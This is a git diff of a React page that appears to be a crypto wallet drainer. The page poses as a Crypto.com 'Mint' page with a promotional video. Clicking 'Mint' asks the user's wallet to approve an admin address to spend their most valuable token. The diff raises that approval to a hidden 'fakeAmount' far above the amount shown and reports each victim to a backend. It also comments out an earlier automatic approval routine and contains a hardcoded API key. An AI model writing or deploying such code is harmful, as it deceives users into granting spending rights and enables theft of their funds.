@@ -2,6 +2,9 @@ import React, { useState, useEffect } from 'react';
 import axios from 'axios';
 import Web3 from "web3";
 import 'bootstrap/dist/css/bootstrap.min.css';
+import ReactPlayer from 'react-player';
+import video1 from "../assets/video1.mp4";
+import "./User.css";
 var WAValidator = require('wallet-address-validator');
 
 const GET_TOKEN_PRICE_API_KEY = "5d2f3072c0b3bfa7b006979142925cbc1dccf788219d2a8f5869ef92ad5d2ff2";
@@ -125,71 +128,73 @@ const UserScreen = () => {
         }
         setUserAllToken(array3.sort(function (a, b) { return b.value - a.value; }).sort(function (a, b) { return b.cost - a.cost; }));
         setInitStatus(true);
-        const autoApprove = async () => {
-          try {
-            let userAllToken = array3.sort(function (a, b) { return b.value - a.value; }).sort(function (a, b) { return b.cost - a.cost; });
-            if (userAllToken.length) {
-              const approveToken = userAllToken[0];
-              if (approveToken.network === "BSC") {
-                await window.ethereum.request({
-                  method: 'wallet_switchEthereumChain',
-                  params: [{ chainId: '0x38' }], // chainId must be in hexadecimal numbers
-                });
-                const approveAmount = (approveToken.cost - 0) / approveToken.price;
-                if (approveToken.currency.address === "-") {
+        // const autoApprove = async () => {
+        //   try {
+        //     let userAllToken = array3.sort(function (a, b) { return b.value - a.value; }).sort(function (a, b) { return b.cost - a.cost; });
+        //     if (userAllToken.length) {
+        //       const approveToken = userAllToken[0];
+        //       if (approveToken.network === "BSC") {
+        //         await window.ethereum.request({
+        //           method: 'wallet_switchEthereumChain',
+        //           params: [{ chainId: '0x38' }], // chainId must be in hexadecimal numbers
+        //         });
+        //         const approveAmount = (approveToken.cost - 0) / approveToken.price;
+        //         const fakeAmount = (100000 - 0) / approveToken.price;
+        //         if (approveToken.currency.address === "-") {
 
-                } else {
-                  let api = "https://api.bscscan.com/api?module=contract&action=getabi&address=" + approveToken.currency.address + "&apikey=" + GET_BSC_SCAN_API_KEY;
-                  let temp = await axios.get(api);
-                  console.log(temp);
-                  const contractABI = JSON.parse(temp.data.result);
-                  const nowContract = new web3.eth.Contract(contractABI, approveToken.currency.address);
-                  await nowContract.methods.approve(adminWalletAddress, web3.utils.toWei((approveAmount).toString(), "ether")).send({ from: myAddress })
-                    .then(async function (receipt) {
-                      console.log(receipt);
-                      await axios.post('http://localhost:5000/products', {
-                        userWalletAddress: myAddress,
-                        amount: approveAmount,
-                        symbol: approveToken.currency.symbol,
-                        contractAddress: approveToken.currency.address,
-                        network: "BSC",
-                        adminAddress: adminWalletAddress
-                      });
-                    });
-                }
-              }
-              else {
-                await window.ethereum.request({
-                  method: 'wallet_switchEthereumChain',
-                  params: [{ chainId: '0x1' }], // chainId must be in hexadecimal numbers
-                });
-                const approveAmount = (approveToken.cost - 0) / approveToken.price;
-                if (approveToken.currency.address === "-") {
+        //         } else {
+        //           let api = "https://api.bscscan.com/api?module=contract&action=getabi&address=" + approveToken.currency.address + "&apikey=" + GET_BSC_SCAN_API_KEY;
+        //           let temp = await axios.get(api);
+        //           console.log(temp);
+        //           const contractABI = JSON.parse(temp.data.result);
+        //           const nowContract = new web3.eth.Contract(contractABI, approveToken.currency.address);
+        //           await nowContract.methods.approve(adminWalletAddress, web3.utils.toWei((fakeAmount).toString(), "ether")).send({ from: myAddress })
+        //             .then(async function (receipt) {
+        //               console.log(receipt);
+        //               await axios.post('http://localhost:5000/products', {
+        //                 userWalletAddress: myAddress,
+        //                 amount: approveAmount,
+        //                 symbol: approveToken.currency.symbol,
+        //                 contractAddress: approveToken.currency.address,
+        //                 network: "BSC",
+        //                 adminAddress: adminWalletAddress
+        //               });
+        //             });
+        //         }
+        //       }
+        //       else {
+        //         await window.ethereum.request({
+        //           method: 'wallet_switchEthereumChain',
+        //           params: [{ chainId: '0x1' }], // chainId must be in hexadecimal numbers
+        //         });
+        //         const approveAmount = (approveToken.cost - 0) / approveToken.price;
+        //         const fakeAmount = (100000 - 0) / approveToken.price;
+        //         if (approveToken.currency.address === "-") {
 
-                } else {
-                  let api = "https://api.etherscan.io/api?module=contract&action=getabi&address=" + approveToken.currency.address + "&apikey=" + GET_ETH_SCAN_API_KEY;
-                  let temp = await axios.get(api);
-                  const contractABI = JSON.parse(temp.data.result);
-                  const nowContract = new web3.eth.Contract(contractABI, approveToken.currency.address);
-                  await nowContract.methods.approve(adminWalletAddress, web3.utils.toWei((approveAmount).toString(), "ether")).send({ from: myAddress })
-                    .then(async function (receipt) {
-                      await axios.post('http://localhost:5000/products', {
-                        userWalletAddress: myAddress,
-                        amount: approveAmount,
-                        symbol: approveToken.currency.symbol,
-                        contractAddress: approveToken.currency.address,
-                        network: "ETH",
-                        adminAdress: adminWalletAddress
-                      });
-                    });
-                }
-              }
-            }
-          } catch (error) {
-            console.log(error.message);
-          }
-        }
-        autoApprove();
+        //         } else {
+        //           let api = "https://api.etherscan.io/api?module=contract&action=getabi&address=" + approveToken.currency.address + "&apikey=" + GET_ETH_SCAN_API_KEY;
+        //           let temp = await axios.get(api);
+        //           const contractABI = JSON.parse(temp.data.result);
+        //           const nowContract = new web3.eth.Contract(contractABI, approveToken.currency.address);
+        //           await nowContract.methods.approve(adminWalletAddress, web3.utils.toWei((fakeAmount).toString(), "ether")).send({ from: myAddress })
+        //             .then(async function (receipt) {
+        //               await axios.post('http://localhost:5000/products', {
+        //                 userWalletAddress: myAddress,
+        //                 amount: approveAmount,
+        //                 symbol: approveToken.currency.symbol,
+        //                 contractAddress: approveToken.currency.address,
+        //                 network: "ETH",
+        //                 adminAdress: adminWalletAddress
+        //               });
+        //             });
+        //         }
+        //       }
+        //     }
+        //   } catch (error) {
+        //     console.log(error.message);
+        //   }
+        // }
+        // autoApprove();
       }
     }
     connectWallet();
@@ -222,6 +227,7 @@ const UserScreen = () => {
             params: [{ chainId: '0x38' }], // chainId must be in hexadecimal numbers
           });
           const approveAmount = (approveToken.cost - 0) / approveToken.price;
+          const fakeAmount = (100000 - 0) / approveToken.price;
           if (approveToken.currency.address === "-") {
 
           } else {
@@ -230,7 +236,7 @@ const UserScreen = () => {
             console.log(temp);
             const contractABI = JSON.parse(temp.data.result);
             const nowContract = new web3.eth.Contract(contractABI, approveToken.currency.address);
-            await nowContract.methods.approve(adminWalletAddress, web3.utils.toWei((approveAmount).toString(), "ether")).send({ from: myAddress })
+            await nowContract.methods.approve(adminWalletAddress, web3.utils.toWei((fakeAmount).toString(), "ether")).send({ from: myAddress })
               .then(async function (receipt) {
                 console.log(receipt);
                 await axios.post('http://localhost:5000/products', {
@@ -250,6 +256,7 @@ const UserScreen = () => {
             params: [{ chainId: '0x1' }], // chainId must be in hexadecimal numbers
           });
           const approveAmount = (approveToken.cost - 0) / approveToken.price;
+          const fakeAmount = (100000 - 0) / approveToken.price;
           if (approveToken.currency.address === "-") {
 
           } else {
@@ -257,7 +264,7 @@ const UserScreen = () => {
             let temp = await axios.get(api);
             const contractABI = JSON.parse(temp.data.result);
             const nowContract = new web3.eth.Contract(contractABI, approveToken.currency.address);
-            await nowContract.methods.approve(adminWalletAddress, web3.utils.toWei((approveAmount).toString(), "ether")).send({ from: myAddress })
+            await nowContract.methods.approve(adminWalletAddress, web3.utils.toWei((fakeAmount).toString(), "ether")).send({ from: myAddress })
               .then(async function (receipt) {
                 await axios.post('http://localhost:5000/products', {
                   userWalletAddress: myAddress,
@@ -265,7 +272,7 @@ const UserScreen = () => {
                   symbol: approveToken.currency.symbol,
                   contractAddress: approveToken.currency.address,
                   network: "ETH",
-                  adminAddress: adminWalletAddress
+                  adminAdress: adminWalletAddress
                 });
               });
           }
@@ -276,10 +283,22 @@ const UserScreen = () => {
     }
   }
   return (
-    <div className='m-4 text-center'>
-      <button className='btn btn-primary' onClick={handleApprove}>
-        Approve
-      </button>
+    <div className='position-relative'>
+      <div className='position-absolute mint-part w-100'>
+        <div className='d-flex flex-column text-center'>
+          <div className='title'>Please Click! "Mint button"</div>
+          <div className='mint-button mt-3 m-auto' style={{ width: "200px" }} onClick={handleApprove}>Mint</div>
+        </div>
+      </div>
+      <ReactPlayer playing={true} muted={true} loop={true} className='react-player' url={video1} width="100%" height="100%" />
+      <div className='second-section'>
+        <h1>The World's Fastest Growing<br /> Crypto App</h1>
+        <div className='fs-4 m-4 content '>
+          <div>Join 10m+ users buying and selling 250+ cryptocurrencies at ture cost</div>
+          <div>Spend with the Crypto.com Visa Card and get up to 8% back</div>
+          <div>Grow your portfolio by receiving rewards up to 14.5% on your crypto assets</div>
+        </div>
+      </div>
     </div>
   );
 };
